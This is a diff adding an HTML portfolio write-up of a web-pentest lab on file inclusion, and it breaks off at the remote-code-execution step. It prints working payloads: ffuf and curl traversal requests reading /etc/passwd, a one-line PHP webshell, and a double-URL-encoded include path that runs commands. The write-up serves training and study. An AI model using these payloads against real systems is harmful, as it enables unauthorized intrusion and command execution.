@@ -1,0 +1,1320 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Inclusion — Skills Assessment | PLSCARRYME</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --accent: #ff6b7a;
+            --accent-dark: #dc3545;
+            --accent-glow: rgba(220, 53, 69, 0.35);
+            --accent-subtle: rgba(220, 53, 69, 0.12);
+            --bg: #0a0d12;
+            --bg2: #0f1318;
+            --surface: rgba(255, 255, 255, 0.04);
+            --surface2: rgba(255, 255, 255, 0.07);
+            --text: #d4dbe8;
+            --muted: #7a8799;
+            --border: rgba(220, 53, 69, 0.18);
+            --red: #ff6b7a;
+            --red-subtle: rgba(220, 53, 69, 0.12);
+            --red-glow: rgba(220, 53, 69, 0.3);
+            --green: #5acd7a;
+            --green-subtle: rgba(40, 167, 69, 0.1);
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        /* ── NAV ── */
+        header {
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 2px solid var(--accent-dark);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 1rem 1.5rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #dc3545;
+            text-decoration: none;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: var(--accent);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 0.95rem;
+            padding: 0.5rem 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            transition: all 0.3s;
+        }
+
+        .back-btn:hover {
+            background: var(--accent-subtle);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+
+        /* ── HERO ── */
+        .writeup-hero {
+            background: linear-gradient(135deg, #0a0d12 0%, #120d0d 50%, #0f0a0a 100%);
+            border-bottom: 1px solid rgba(220, 53, 69, 0.2);
+            padding: 3.5rem 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .writeup-hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -20%;
+            width: 600px;
+            height: 600px;
+            background: radial-gradient(circle, rgba(220, 53, 69, 0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .writeup-hero::after {
+            content: '';
+            position: absolute;
+            bottom: -30%;
+            right: -10%;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(220, 53, 69, 0.04) 0%, transparent 70%);
+            pointer-events: none;
+        }
+
+        .hero-inner {
+            max-width: 1100px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero-badges {
+            display: flex;
+            gap: 0.75rem;
+            flex-wrap: wrap;
+            margin-bottom: 1.5rem;
+        }
+
+        .badge {
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .badge.red {
+            background: rgba(220, 53, 69, 0.8);
+            color: #fff;
+        }
+
+        .badge.outline {
+            border: 1px solid var(--border);
+            color: var(--muted);
+            background: transparent;
+        }
+
+        .writeup-hero h1 {
+            font-size: clamp(1.8rem, 4vw, 2.8rem);
+            color: var(--red);
+            margin-bottom: 1rem;
+            font-weight: 700;
+            line-height: 1.2;
+            text-shadow: 0 0 40px rgba(220, 53, 69, 0.3);
+        }
+
+        .writeup-hero p.subtitle {
+            font-size: 1.05rem;
+            color: var(--muted);
+            max-width: 700px;
+            margin-bottom: 2rem;
+        }
+
+        .hero-meta {
+            display: flex;
+            gap: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .hero-meta span {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.9rem;
+            color: var(--muted);
+        }
+
+        .hero-meta i {
+            color: var(--red);
+        }
+
+        /* ── LAYOUT ── */
+        .content-wrap {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 3rem 1.5rem;
+            display: grid;
+            grid-template-columns: 1fr 280px;
+            gap: 3rem;
+            align-items: start;
+        }
+
+        @media (max-width: 900px) {
+            .content-wrap {
+                grid-template-columns: 1fr;
+            }
+
+            .sidebar {
+                order: -1;
+            }
+        }
+
+        /* ── SIDEBAR ── */
+        .sidebar {
+            position: sticky;
+            top: 90px;
+        }
+
+        .sidebar-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .sidebar-card h4 {
+            color: var(--accent);
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.1em;
+            margin-bottom: 1rem;
+        }
+
+        .toc-list {
+            list-style: none;
+        }
+
+        .toc-list li {
+            border-left: 2px solid var(--border);
+            padding: 0.4rem 0 0.4rem 0.9rem;
+            margin-bottom: 0.2rem;
+            transition: border-color 0.2s;
+        }
+
+        .toc-list li:hover {
+            border-color: var(--accent);
+        }
+
+        .toc-list a {
+            color: var(--muted);
+            text-decoration: none;
+            font-size: 0.88rem;
+            transition: color 0.2s;
+        }
+
+        .toc-list a:hover {
+            color: var(--accent);
+        }
+
+        .skill-pill {
+            display: inline-block;
+            background: var(--accent-subtle);
+            color: var(--accent);
+            border: 1px solid var(--border);
+            padding: 0.25rem 0.6rem;
+            border-radius: 20px;
+            font-size: 0.78rem;
+            margin: 0.2rem;
+        }
+
+        .skill-pill.red {
+            background: var(--red-subtle);
+            color: var(--red);
+            border-color: rgba(220, 53, 69, 0.25);
+        }
+
+        /* ── MAIN CONTENT ── */
+        .section-block {
+            margin-bottom: 3.5rem;
+        }
+
+        .section-block h2 {
+            font-size: 1.6rem;
+            color: var(--accent);
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.6rem;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .section-block h3 {
+            font-size: 1.15rem;
+            color: #ffb3bb;
+            margin: 1.8rem 0 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .section-block p {
+            color: var(--text);
+            margin-bottom: 1rem;
+        }
+
+        /* ── SCENARIO BOX ── */
+        .scenario-box {
+            background: linear-gradient(135deg, rgba(220, 53, 69, 0.06), rgba(220, 53, 69, 0.04));
+            border: 1px solid rgba(220, 53, 69, 0.25);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .scenario-box h3 {
+            color: var(--red);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .scenario-box p {
+            font-size: 0.95rem;
+            color: var(--text);
+            margin: 0;
+        }
+
+        /* ── CODE BLOCKS ── */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 1rem 0;
+        }
+
+        .code-block .code-bar {
+            background: rgba(220, 53, 69, 0.1);
+            border-bottom: 1px solid rgba(220, 53, 69, 0.15);
+            padding: 0.45rem 1rem;
+            font-size: 0.78rem;
+            color: var(--muted);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .code-block pre {
+            padding: 1.2rem 1.3rem;
+            font-size: 0.83rem;
+            line-height: 1.75;
+            overflow-x: auto;
+            margin: 0;
+            color: #ffd0d5;
+            font-family: 'Courier New', Consolas, monospace;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .code-block pre .c-cmd {
+            color: #ff9eaa;
+        }
+
+        .code-block pre .c-flag {
+            color: #ffa657;
+        }
+
+        .code-block pre .c-val {
+            color: #a5d6a7;
+        }
+
+        .code-block pre .c-url {
+            color: #ffcfa5;
+        }
+
+        .code-block pre .c-highlight {
+            color: #ff7b72;
+        }
+
+        /* ── FINDING CARDS ── */
+        .finding-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .finding-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1.2rem;
+            transition: all 0.3s;
+        }
+
+        .finding-card:hover {
+            border-color: var(--red);
+            background: var(--surface2);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 20px var(--red-glow);
+        }
+
+        .finding-card .fc-icon {
+            font-size: 1.4rem;
+            color: var(--red);
+            margin-bottom: 0.6rem;
+            display: block;
+        }
+
+        .finding-card h4 {
+            color: #ffd0d5;
+            font-size: 0.95rem;
+            margin-bottom: 0.4rem;
+        }
+
+        .finding-card p {
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin: 0;
+        }
+
+        /* ── ATTACK CHAIN STEPS ── */
+        .attack-steps {
+            margin: 1.5rem 0;
+            position: relative;
+        }
+
+        .attack-steps::before {
+            content: '';
+            position: absolute;
+            left: 22px;
+            top: 28px;
+            bottom: 28px;
+            width: 2px;
+            background: linear-gradient(to bottom, rgba(220, 53, 69, 0.8), transparent);
+        }
+
+        .step {
+            display: flex;
+            gap: 1.2rem;
+            margin-bottom: 1.2rem;
+            position: relative;
+        }
+
+        .step-num {
+            width: 44px;
+            height: 44px;
+            min-width: 44px;
+            background: rgba(220, 53, 69, 0.8);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.9rem;
+            color: #fff;
+            box-shadow: 0 0 20px var(--red-glow);
+            position: relative;
+            z-index: 1;
+        }
+
+        .step-body {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 1rem 1.2rem;
+            flex: 1;
+            transition: all 0.3s;
+        }
+
+        .step-body:hover {
+            background: var(--surface2);
+            border-color: rgba(220, 53, 69, 0.4);
+        }
+
+        .step-body h4 {
+            color: #ffd0d5;
+            font-size: 0.95rem;
+            margin-bottom: 0.3rem;
+        }
+
+        .step-body p {
+            font-size: 0.85rem;
+            color: var(--muted);
+            margin: 0;
+        }
+
+        /* ── BYPASS ANATOMY ── */
+        .bypass-box {
+            background: linear-gradient(135deg, rgba(255, 140, 50, 0.07), rgba(220, 53, 69, 0.04));
+            border: 1px solid rgba(255, 140, 50, 0.35);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+        }
+
+        .bypass-box h3 {
+            color: #ff9d57;
+            margin-bottom: 1.2rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+
+        .logic-block {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(220, 53, 69, 0.2);
+            border-radius: 10px;
+            padding: 1.2rem 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.83rem;
+            line-height: 2;
+        }
+
+        .logic-block .lk {
+            color: var(--accent);
+            font-weight: 700;
+        }
+
+        .logic-block .lv {
+            color: #ffd0d5;
+        }
+
+        .logic-block .lc {
+            color: #6a9955;
+            font-style: italic;
+        }
+
+        .logic-block .lh {
+            color: var(--red);
+        }
+
+        /* ── ENCODE TABLE ── */
+        .encode-table-wrap {
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 0.9rem;
+        }
+
+        thead th {
+            background: rgba(220, 53, 69, 0.12);
+            color: var(--accent);
+            padding: 0.9rem 1rem;
+            text-align: left;
+            border-bottom: 2px solid var(--accent-dark);
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+        }
+
+        tbody td {
+            padding: 0.85rem 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            vertical-align: middle;
+            font-family: 'Courier New', monospace;
+            font-size: 0.87rem;
+        }
+
+        tbody td.label-col {
+            font-family: 'Segoe UI', sans-serif;
+            color: var(--text);
+            font-weight: 600;
+        }
+
+        tbody tr:hover td {
+            background: var(--surface);
+        }
+
+        .enc-val {
+            color: #ffa657;
+        }
+
+        .enc-result {
+            color: var(--green);
+        }
+
+        /* ── FLAG BOX ── */
+        .flag-box {
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.08), rgba(220, 53, 69, 0.06));
+            border: 1px solid rgba(90, 205, 122, 0.3);
+            border-radius: 14px;
+            padding: 2rem;
+            margin: 1.5rem 0;
+            text-align: center;
+        }
+
+        .flag-box .flag-icon {
+            font-size: 2.5rem;
+            color: var(--green);
+            margin-bottom: 0.8rem;
+        }
+
+        .flag-box h3 {
+            color: var(--green);
+            font-size: 1.3rem;
+            margin-bottom: 0.6rem;
+        }
+
+        .flag-box .flag-file {
+            font-family: 'Courier New', monospace;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(90, 205, 122, 0.25);
+            border-radius: 8px;
+            padding: 0.8rem 1.5rem;
+            display: inline-block;
+            color: var(--green);
+            font-size: 1rem;
+            margin-top: 0.5rem;
+        }
+
+        /* ── TAKEAWAYS ── */
+        .takeaway-box {
+            background: linear-gradient(135deg, rgba(40, 167, 69, 0.06), rgba(220, 53, 69, 0.06));
+            border: 1px solid rgba(90, 205, 122, 0.2);
+            border-radius: 12px;
+            padding: 1.8rem;
+            margin-top: 2rem;
+        }
+
+        .takeaway-box h3 {
+            color: #5acd7a;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .takeaway-box ul {
+            list-style: none;
+        }
+
+        .takeaway-box li {
+            padding: 0.4rem 0;
+            padding-left: 1.2rem;
+            position: relative;
+            color: var(--text);
+            font-size: 0.93rem;
+        }
+
+        .takeaway-box li::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #5acd7a;
+        }
+
+        /* ── VULN LABEL ── */
+        .vuln-label {
+            display: inline-block;
+            font-weight: 700;
+            padding: 0.2rem 0.6rem;
+            border-radius: 6px;
+            font-size: 0.82rem;
+            white-space: nowrap;
+        }
+
+        .vuln-lfi {
+            background: rgba(220, 53, 69, 0.2);
+            color: #ff6b7a;
+            border: 1px solid rgba(220, 53, 69, 0.3);
+        }
+
+        .vuln-rce {
+            background: rgba(255, 100, 0, 0.2);
+            color: #ff8c42;
+            border: 1px solid rgba(255, 100, 0, 0.3);
+        }
+
+        .vuln-upload {
+            background: rgba(255, 193, 7, 0.15);
+            color: #ffc107;
+            border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+
+        .vuln-dbl {
+            background: rgba(155, 89, 182, 0.2);
+            color: #c39bd3;
+            border: 1px solid rgba(155, 89, 182, 0.3);
+        }
+
+        /* ── INLINE CODE ── */
+        code {
+            background: rgba(220, 53, 69, 0.12);
+            color: var(--accent);
+            padding: 0.1rem 0.4rem;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.88em;
+        }
+
+        /* ── NOTE CALLOUT ── */
+        .callout {
+            display: flex;
+            gap: 0.8rem;
+            align-items: flex-start;
+            background: rgba(220, 53, 69, 0.06);
+            border-left: 3px solid var(--accent-dark);
+            border-radius: 0 8px 8px 0;
+            padding: 0.9rem 1.1rem;
+            margin: 1rem 0;
+            font-size: 0.9rem;
+            color: var(--muted);
+        }
+
+        .callout i {
+            color: var(--accent);
+            margin-top: 0.15rem;
+            min-width: 14px;
+        }
+
+        .callout.warn {
+            border-left-color: #ffc107;
+            background: rgba(255, 193, 7, 0.05);
+        }
+
+        .callout.warn i {
+            color: #ffc107;
+        }
+
+        /* ── FOOTER ── */
+        footer {
+            background: rgba(0, 0, 0, 0.8);
+            border-top: 1px solid var(--border);
+            text-align: center;
+            padding: 2rem 1.5rem;
+            color: var(--muted);
+            font-size: 0.9rem;
+        }
+
+        footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        /* Scroll progress */
+        #progress {
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #dc3545, #ff6b7a);
+            z-index: 9999;
+            width: 0%;
+            transition: width 0.1s;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div id="progress"></div>
+
+    <header>
+        <nav>
+            <a href="../index.html" class="logo"><i class="fas fa-terminal"></i> ANDY - Cybersecurity Portfolio</a>
+            <a href="../index.html" class="back-btn"><i class="fas fa-arrow-left"></i> Back to Portfolio</a>
+        </nav>
+    </header>
+
+    <!-- Hero -->
+    <div class="writeup-hero">
+        <div class="hero-inner">
+            <div class="hero-badges">
+                <span class="badge red"><i class="fas fa-skull-crossbones"></i> &nbsp;Red Team</span>
+                <span class="badge outline">Skills Assessment</span>
+                <span class="badge outline">Web Application Pentesting</span>
+            </div>
+            <h1>File Inclusion — Skills Assessment</h1>
+            <p class="subtitle">
+                A full chain exploitation walkthrough: LFI path traversal bypass, source code disclosure via
+                directory backtracking, unrestricted file upload to webshell, and double URL-encoding to achieve
+                unauthenticated Remote Code Execution.
+            </p>
+            <div class="hero-meta">
+                <span><i class="fas fa-crosshairs"></i> Offensive / Web App</span>
+                <span><i class="fas fa-list-check"></i> 4 Phases</span>
+                <span><i class="fas fa-tag"></i> LFI · File Upload · RCE · Path Traversal</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main layout -->
+    <div class="content-wrap">
+
+        <!-- Article -->
+        <article>
+
+            <!-- 1. Scenario -->
+            <div class="section-block" id="s1">
+                <h2><i class="fas fa-briefcase"></i> 1. Scenario & Scope</h2>
+                <p>
+                    This engagement simulates a black-box web application penetration test contracted by
+                    <strong style="color: var(--accent);">Sumace Consulting GmbH</strong>.
+                    During the kickoff meeting, the CISO noted the previous year's test returned zero findings,
+                    but a job application form had since been added — flagged as a potential area of interest.
+                </p>
+
+                <div class="scenario-box">
+                    <h3><i class="fas fa-file-contract"></i> Engagement Brief</h3>
+                    <p>
+                        <strong style="color: var(--accent);">Client:</strong> Sumace Consulting GmbH<br>
+                        <strong style="color: var(--accent);">Target:</strong> Main company website (single host)<br>
+                        <strong style="color: var(--accent);">Objective:</strong> Gain Remote Code Execution and retrieve
+                        the flag from the <code>/</code> root directory of the filesystem.<br>
+                        <strong style="color: var(--accent);">Prior findings:</strong> Zero (previous year) — new attack
+                        surface: job application form.
+                    </p>
+                </div>
+
+                <p>The attack chain ultimately chains four vulnerabilities together:</p>
+
+                <div class="finding-grid">
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-folder-open"></i></span>
+                        <h4><span class="vuln-label vuln-lfi">LFI</span> Path Traversal</h4>
+                        <p>The <code>image.php?p=</code> parameter is vulnerable to traversal using the
+                            <code>....//</code> filter bypass, leaking arbitrary files.
+                        </p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-file-code"></i></span>
+                        <h4><span class="vuln-label vuln-upload">Unrestricted Upload</span></h4>
+                        <p><code>application.php</code> accepts any file extension — a PHP webshell can be uploaded
+                            directly to the <code>/uploads/</code> directory.</p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-percent"></i></span>
+                        <h4><span class="vuln-label vuln-dbl">Double URL Encode</span></h4>
+                        <p><code>contact.php</code> checks <code>$_GET["region"]</code> before calling
+                            <code>urldecode()</code>, allowing <code>%252e</code>/<code>%252f</code> to bypass the
+                            filter.
+                        </p>
+                    </div>
+                    <div class="finding-card">
+                        <span class="fc-icon"><i class="fas fa-terminal"></i></span>
+                        <h4><span class="vuln-label vuln-rce">RCE</span> via Include</h4>
+                        <p>Chaining the upload with the <code>contact.php</code> include gives full unauthenticated
+                            Remote Code Execution.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- 2. Recon -->
+            <div class="section-block" id="s2">
+                <h2><i class="fas fa-search"></i> 2. Reconnaissance</h2>
+                <p>
+                    The recon phase begins with reviewing the site's HTML source. Inspecting the page reveals that
+                    images are served through a dedicated API endpoint rather than directly:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-code"></i> Source — image API endpoint discovered</div>
+                    <pre><span class="c-highlight">/api/image.php?p=a4cbc9532b6364a008e2ac58347e3e3c</span></pre>
+                </div>
+
+                <p>
+                    The <code>p</code> parameter accepts a value that maps to a file. This is a classic
+                    indicator of a potential file inclusion or path traversal vulnerability — the server is
+                    resolving a filename based on user-controlled input.
+                </p>
+
+                <h3><i class="fas fa-random"></i> Fuzzing the Parameter</h3>
+                <p>
+                    Using <strong>ffuf</strong> with a dedicated LFI wordlist, we fuzz the <code>p</code>
+                    parameter and filter out empty responses (size 0) to identify which payloads produce output:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> ffuf — LFI parameter fuzzing</div>
+                    <pre><span class="c-cmd">ffuf</span> <span class="c-flag">-w</span> <span class="c-val">LFI-Jhaddix.txt</span> <span class="c-flag">-u</span> <span class="c-url">http://TARGET:PORT/api/image.php?p=FUZZ</span> <span class="c-flag">-fs</span> <span class="c-val">0</span></pre>
+                </div>
+
+                <p>
+                    Results confirm the parameter is live and responding to traversal-style payloads. Next, we
+                    verify LFI manually with a targeted curl request using the <code>....//</code> bypass technique:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> curl — confirming LFI with ....// bypass</div>
+                    <pre><span class="c-cmd">curl</span> <span class="c-url">'http://TARGET:PORT/api/image.php?p=....//....//....//....//....//....//etc/passwd'</span></pre>
+                </div>
+
+                <div class="callout">
+                    <i class="fas fa-info-circle"></i>
+                    <span>The <code>....//</code> bypass works because the server strips <code>../</code> sequences
+                        naively. After stripping, <code>....//</code> collapses to <code>../</code> — effectively
+                        traversing up one directory level. Chaining multiple instances reaches the filesystem
+                        root.</span>
+                </div>
+
+                <p>
+                    The <code>/etc/passwd</code> file is successfully returned, confirming LFI is exploitable.
+                    The server is running PHP and the endpoint resolves files relative to a web root directory.
+                </p>
+            </div>
+
+            <!-- 3. Source Code Disclosure -->
+            <div class="section-block" id="s3">
+                <h2><i class="fas fa-file-code"></i> 3. Source Code Disclosure</h2>
+                <p>
+                    With LFI confirmed, the next step is to read the source code of pages we've identified on
+                    the site. Two pages of interest are visible in the navigation:
+                    <code>contact.php</code> and <code>apply.php</code>.
+                    By using the same traversal bypass, we can retrieve their raw PHP source:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fas fa-terminal"></i> Reading apply.php source via LFI</div>
+                    <pre><span class="c-cmd">curl</span> <span class="c-url">'http://TARGET:PORT/api/image.php?p=....//apply.php'</span></pre>
+                </div>
+
+                <h3><i class="fas fa-upload"></i> Finding: Unrestricted File Upload in apply.php</h3>
+                <p>
+                    The <code>apply.php</code> source reveals a job application form that POST's to
+                    <code>/api/application.php</code>. Retrieving that file's source exposes the upload handler logic:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fab fa-php"></i> application.php — upload handler (extracted)</div>
+                    <pre>$tmp_name = $_FILES["file"]["tmp_name"];
+$file_name = $_FILES["file"]["name"];
+<span class="c-highlight">$ext = end((explode(".", $file_name)));  // extension taken directly from filename</span>
+<span class="c-highlight">$target_file = "../uploads/" . md5_file($tmp_name) . "." . $ext;</span>
+move_uploaded_file($tmp_name, $target_file);  <span class="c-val">// no extension validation</span></pre>
+                </div>
+
+                <div class="callout warn">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <span><strong>Critical finding:</strong> The extension is extracted directly from the original
+                        filename with zero validation. Any file type — including <code>.php</code> — will be accepted
+                        and stored. The uploaded file is saved as
+                        <code>/uploads/&lt;md5_of_file&gt;.&lt;ext&gt;</code>.</span>
+                </div>
+
+                <h3><i class="fas fa-code-branch"></i> Finding: Double URL-Encode Bypass in contact.php</h3>
+                <p>
+                    Retrieving <code>contact.php</code> source reveals a broken security check on the
+                    <code>region</code> GET parameter, which is passed directly to PHP's <code>include()</code>:
+                </p>
+
+                <div class="code-block">
+                    <div class="code-bar"><i class="fab fa-php"></i> contact.php — vulnerable include logic</div>
+                    <pre><span class="c-val">// Step 1: Check for "." and "/" in the RAW GET value (already decoded once by PHP)</span>
+if (str_contains(<span class="c-highlight">$_GET["region"]</span>, ".") || str_contains(<span class="c-highlight">$_GET["region"]</span>, "/")) {
+    echo "Invalid character(s)";
+    $danger = true;
+} else {
+    <span class="c-val">// Step 2: THEN manually URL-decode again</span>
+    $region = <span class="c-highlight">urldecode($_GET["region"]);</span>
+}
+
+<span class="c-val">// Step 3: Include the result — traversal is possible after the second decode</span>
+include "./regions/" . $region . ".php";</pre>
+                </div>
+
+                <div class="bypass-box">
+                    <h3><i class="fas fa-unlock-alt"></i> The Double URL-Encoding Bypass</h3>
+                    <p style="color: var(--muted); font-size: 0.93rem; margin-bottom: 1rem;">
+                        PHP automatically decodes the URL once before the script sees <code>$_GET</code> values.
+                        The check runs on that already-decoded value. Then the code calls <code>urldecode()</code>
+                        <em>again</em>. By double-encoding the forbidden characters, we pass the check and the second
+                        decode reconstructs the traversal sequence:
+                    </p>
+                    <div class="encode-table-wrap">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Character</th>
+                                    <th>Single Encode</th>
+                                    <th>Double Encode (sent)</th>
+                                    <th>After PHP auto-decode</th>
+                                    <th>After urldecode()</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td class="label-col">. (dot)</td>
+                                    <td><span class="enc-val">%2e</span></td>
+                                    <td><span class="enc-val">%252e</span></td>
+                                    <td>%2e &nbsp;← passes check ✓</td>
+                                    <td><span class="enc-result">.</span></td>
+                                </tr>
+                                <tr>
+                                    <td class="label-col">/ (slash)</td>
+                                    <td><span class="enc-val">%2f</span></td>
+                                    <td><span class="enc-val">%252f</span></td>
+                                    <td>%2f &nbsp;← passes check ✓</td>
+                                    <td><span class="enc-result">/</span></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <p style="color: var(--muted); font-size: 0.88rem; margin-top: 0.8rem;">
+                        <i class="fas fa-lightbulb" style="color:#ff9d57;"></i>
+                        &nbsp;The check sees <code>%2e</code> and <code>%2f</code> — neither contains a literal dot
+                        or slash, so <code>$danger</code> stays <code>false</code>. The subsequent
+                        <code>urldecode()</code> call then converts them back into <code>.</code> and <code>/</code>,
+                        enabling full path traversal into the include statement.
+                    </p>
+                </div>
+            </div>
+
+            <!-- 4. Exploit Chain -->
+            <div class="section-block" id="s4">
+                <h2><i class="fas fa-bomb"></i> 4. Exploitation — Full RCE Chain</h2>
+                <p>
+                    With two vulnerabilities identified — unrestricted file upload and an LFI-to-RCE path via
+                    <code>contact.php</code> — the attack chain becomes clear:
+                    upload a PHP webshell, then include it via the double-encoded traversal in <code>contact.php</code>.
+                </p>
+
+                <div class="attack-steps">
+                    <div class="step">
+                        <div class="step-num">1</div>
+                        <div class="step-body">
+                            <h4>Craft the Webshell</h4>
+                            <p>Create a minimal PHP webshell that passes the <code>cmd</code> GET parameter directly to
+                                <code>system()</code>. Save it as <code>shell.php</code>.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 1.2rem 3.8rem;">
+                        <div class="code-bar"><i class="fab fa-php"></i> shell.php — webshell payload</div>
+                        <pre><span class="c-highlight">&lt;?php system($_GET["cmd"]); ?&gt;</span></pre>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">2</div>
+                        <div class="step-body">
+                            <h4>Calculate the MD5 Hash</h4>
+                            <p>The upload handler names files using <code>md5_file()</code> on the uploaded content.
+                                Pre-calculate the MD5 of our shell to know exactly where it will land.</p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 1.2rem 3.8rem;">
+                        <div class="code-bar"><i class="fas fa-terminal"></i> Calculating the upload path</div>
+                        <pre><span class="c-cmd">md5sum</span> shell.php | cut -d' ' -f1
+<span class="c-val">fc023fcacb27a7ad72d605c4e300b389</span>
+
+<span class="c-val"># Uploaded file will be at:</span>
+<span class="c-highlight">/uploads/fc023fcacb27a7ad72d605c4e300b389.php</span></pre>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">3</div>
+                        <div class="step-body">
+                            <h4>Upload via the Application Form</h4>
+                            <p>Submit the webshell through the <code>/apply.php</code> job application form, providing
+                                dummy values for the required fields (<code>firstName</code>, <code>lastName</code>,
+                                <code>email</code>). The server accepts <code>shell.php</code> without complaint and
+                                stores it in <code>/uploads/</code>.
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-num">4</div>
+                        <div class="step-body">
+                            <h4>Trigger RCE via contact.php Include</h4>
+                            <p>Use the double URL-encoded traversal in the <code>region</code> parameter to include our
+                                uploaded webshell. Append the <code>cmd</code> parameter to execute arbitrary
+                                commands.</p>
+                        </div>
+                    </div>
+
+                    <div class="code-block" style="margin: 0 0 1.2rem 3.8rem;">
+                        <div class="code-bar"><i class="fas fa-globe"></i> RCE — listing the filesystem root</div>
+                        <pre><span class="c-url">http://TARGET:PORT/contact.php
+  ?region=<span class="c-highlight">%252e%252e%252fuploads%252ffc023fcacb27a7ad72d605c4e300b389</span>
+  &cmd=<span class="c-val">ls%20/</span></span>
+
+<span class="c-val"># Decoded path that PHP resolves:</span>
+<span class="c-val">./regions/../uploads/fc023fcacb27a7ad72d605c4e300b389.php</span>
